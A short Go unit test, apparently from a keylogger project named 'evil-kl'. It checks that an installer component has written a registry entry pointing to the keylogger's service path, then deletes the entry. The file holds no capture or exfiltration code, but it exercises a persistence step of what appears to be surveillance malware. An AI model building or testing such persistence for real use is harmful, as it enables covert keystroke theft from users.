package installer

import (
	"testing"

	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/pkg/registry"
)

func TestInstaller_isInstalled(t *testing.T) {
	configInst := new(config.Config).Create()
	cfg := configInst.GetConfig()

	registryInst := new(registry.Registry).Create()
	registryInst.SetStringValue(cfg.Installer.RegPath, cfg.Installer.RegName, cfg.Installer.ServicePath)
	defer registryInst.DeleteStringValue(cfg.Installer.RegPath, cfg.Installer.RegName)

	tests := []struct {
		name string
		i    *Installer
		want bool
	}{
		{
			name: "success installed",
			i:    new(Installer).Create(cfg.Keylogger.Path, cfg.Installer),
			want: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.i.isInstalled(); got != tt.want {
				t.Errorf("Installer.isInstalled() = %v, want %v", got, tt.want)
			}
		})
	}
}
